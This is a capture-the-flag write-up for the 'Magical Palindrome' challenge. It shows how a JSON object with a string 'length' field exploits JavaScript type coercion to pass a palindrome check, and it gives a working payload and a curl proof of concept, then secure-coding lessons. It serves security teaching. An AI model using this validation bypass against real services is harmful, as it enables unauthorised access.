# CTF Writeup : Magical Palindrome

> Mr Axidion | 2025-12-30  

**Focus:** Exploiting JavaScript Type Coercion & JSON Object Injection  

---

## 1. Challenge Overview

The application expects a palindrome (a string that reads the same forwards and backwards), but enforces two conflicting constraints:

- The input must have a length of at least 1000 (`length >= 1000`)
- The maximum request body size is limited to 75 bytes (Nginx restriction)

### Problem

It is impossible to send a real 1000-character string within 75 bytes. Therefore, the goal is to bypass the validation logic by abusing JavaScript behavior.

---

## 2. Source Code Analysis

The validation logic is implemented as follows:

```javascript
const IsPalinDrome = (string) => {
    if (string.length < 1000) {
        return 'Tootus Shortus';
    }

    for (const i of Array(string.length).keys()) {
        const original = string[i];
        const reverse = string[string.length - i - 1];

        if (original !== reverse || typeof original !== 'string') {
            return 'Notter Palindromer!!';
        }
    }
    return null;
}
```

### Key Observations

- The function assumes the input is a string
- It relies on `.length` without validating the type
- It uses `Array(string.length)` which behaves differently depending on the type of `length`

---

## 3. Exploitation Strategy

Instead of sending a string, a crafted JSON object is used to mimic string-like behavior.

---

### Bypass 1: Length Check

```json
{"length": "1337"}
```

- The comparison `"1337" < 1000` triggers type coercion
- JavaScript converts `"1337"` to a number (1337)
- Since 1337 ≥ 1000, the check is bypassed

---

### Bypass 2: Array Constructor Behavior

```javascript
Array("1337")
```

- If `length` were a number → creates an array with 1337 empty slots
- If `length` is a string → creates an array with a single element

**Impact:** The loop runs only once instead of 1337 times

---

### Bypass 3: Index Calculation

```javascript
string.length - i - 1
```

- `"1337" - 0 - 1` → 1336 (string is coerced to number)
- The function compares only:
  - index `0`
  - index `1336`

---

## 4. Exploit Payload

A minimal JSON payload is crafted to satisfy all checks:

```json
{
  "palindrome": {
    "length": "1337",
    "0": "Z",
    "1336": "Z"
  }
}
```

### Why It Works

- Payload size is under 75 bytes
- The loop runs only once
- Both compared values match
- `typeof original === "string"` is satisfied

---

## 5. Proof of Concept

```bash
curl -X POST http://<TARGET_IP>:<PORT> \
     -H "Content-Type: application/json" \
     -d '{"palindrome":{"length":"1337","0":"Z","1336":"Z"}}'
```

The server accepts the input as a valid palindrome and returns the flag.

---

## 6. Security Lesson

This challenge highlights several important issues:

- Never trust user-controlled types in JavaScript
- Always validate input type explicitly (`typeof input === "string"`)
- Avoid relying on implicit type coercion
- Be cautious when using constructors like `Array()` with untrusted input

Proper validation and strict typing could prevent this entire class of vulnerabilities.
